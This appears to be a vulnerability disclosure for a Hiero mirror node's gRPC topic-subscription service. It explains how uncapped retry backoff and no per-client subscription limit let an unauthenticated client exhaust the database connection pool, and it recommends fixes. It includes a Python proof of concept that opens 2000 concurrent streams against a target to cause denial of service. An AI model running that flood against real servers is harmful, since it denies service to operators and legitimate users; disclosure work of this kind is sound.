### Title
Unbounded Concurrent Subscriptions with Uncapped Retry Backoff Enable DB Connection Pool Exhaustion DoS

### Summary
`PollingTopicMessageRetriever.retrieve()` applies `retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))` with no `maxBackoff` cap, unlike the analogous `SharedPollingTopicListener` which explicitly caps backoff. Because there is no per-client subscription limit or rate gate at the gRPC endpoint, an unauthenticated attacker can open arbitrarily many concurrent subscriptions. Each subscription independently polls the database on its own scheduler thread; when the connection pool is exhausted by the flood, all subscriptions simultaneously receive errors and enter the retry loop, creating a thundering-herd that prevents the pool from recovering and starves legitimate subscribers.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java`, `retrieve()`, lines 45–63:

```java
return Flux.defer(() -> poll(context))
    .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
            .jitter(0.1)
            .withFixedDelay(context.getFrequency())
            .withScheduler(scheduler))
    ...
    .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))   // line 58 — no maxBackoff
    .timeout(retrieverProperties.getTimeout(), scheduler)              // line 59 — 60 s default
```

Compare with `SharedPollingTopicListener` line 51, which caps the backoff:
```java
.retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
```
The retriever omits `.maxBackoff(...)`, so Reactor uses its internal default of `Duration.ofMillis(Long.MAX_VALUE)` — effectively uncapped until the 60-second timeout fires.

**Root cause:** Two independent design gaps compose into an exploitable condition:
1. `ConsensusController.subscribeTopic()` (lines 43–53) and `TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) track `subscriberCount` as a metric gauge only — it is never checked against a maximum to reject new subscriptions.
2. Each accepted subscription runs its own independent `poll()` → `topicMessageRepository.findByFilter()` DB query cycle (line 78), sharing the same bounded R2DBC/JDBC connection pool.

**Exploit flow:**
- Attacker opens N concurrent gRPC `subscribeTopic` streams (no auth required, no rate limit).
- Each stream, in throttled mode, polls the DB every 2 seconds (`pollingFrequency` default, line 25 of `RetrieverProperties`).
- At sufficient N, the connection pool is saturated; DB queries begin failing with connection-acquisition timeouts.
- All N subscriptions simultaneously receive errors and enter `Retry.backoff(Long.MAX_VALUE, 1s)`. Because the backoff is uncapped and all subscriptions started at roughly the same time, their retry schedules are nearly synchronized (0.5 jitter factor is insufficient to spread N=thousands of retries).
- Each retry attempt re-acquires a connection, immediately re-exhausting the pool. The pool never drains.
- Legitimate subscribers' `poll()` calls queue behind attacker retries and time out or are never scheduled.

### Impact Explanation

The database connection pool is a shared, finite resource. Once saturated, all DB-dependent operations fail — including the `topicExists()` check (line 96 of `TopicMessageServiceImpl`), the `missingMessages()` gap-fill queries, and the `SharedPollingTopicListener` shared poll. Legitimate subscribers receive no messages and may be disconnected. The 60-second `timeout` per subscription provides partial mitigation, but the attacker simply reconnects continuously, maintaining pool saturation indefinitely with no per-IP or per-client throttle to stop them. Severity: **High** (availability impact, no authentication required).

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is publicly reachable by design (it is the mirror node's primary consumer API). No credentials, tokens, or prior state are required. A single attacker machine can open thousands of gRPC streams using any standard gRPC client library. The attack is repeatable, scriptable, and requires no special knowledge beyond the published proto API. The missing `maxBackoff` cap is a concrete, measurable difference from the sibling `SharedPollingTopicListener` implementation, confirming the gap is not intentional.

### Recommendation

1. **Cap the retry backoff** in `PollingTopicMessageRetriever.retrieve()` to match the pattern already used in `SharedPollingTopicListener`:
   ```java
   .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1))
       .maxBackoff(Duration.ofSeconds(8)))
   ```
2. **Enforce a maximum concurrent subscription count** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable limit and return `RESOURCE_EXHAUSTED` status when exceeded.
3. **Add per-IP or per-client rate limiting** at the gRPC server layer (e.g., via a `ServerInterceptor`) to throttle subscription open rates.
4. **Isolate retriever DB queries** onto a connection pool separate from the shared listener pool so a retriever storm cannot starve the live-message path.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = basic_types_pb2.TopicID(topicNum=1)
NUM_STREAMS = 2000

def open_subscription(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(topicID=TOPIC_ID)
    try:
        for _ in stub.subscribeTopic(req):
            pass
    except Exception:
        pass  # connection errors expected once pool is saturated

threads = [threading.Thread(target=open_subscription, args=(i,)) for i in range(NUM_STREAMS)]
for t in threads:
    t.start()
# Observe: legitimate subscribeTopic calls now receive no messages or UNAVAILABLE errors.
# DB connection pool metrics show 100% utilization; retriever retry counters spike.
```

**Expected result:** After opening ~N streams (where N exceeds `pool_size / polling_concurrency`), the DB connection pool saturates. Retry storms from failed polls prevent pool recovery. Legitimate subscribers stop receiving messages until the attacker streams time out (60 s) and the attacker stops reconnecting. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L45-63)
```java
    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L65-79)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedPollingTopicListener.java (L51-51)
```java
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-92)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L25-28)
```java
    private Duration pollingFrequency = Duration.ofSeconds(2L);

    @NotNull
    private Duration timeout = Duration.ofSeconds(60L);
```
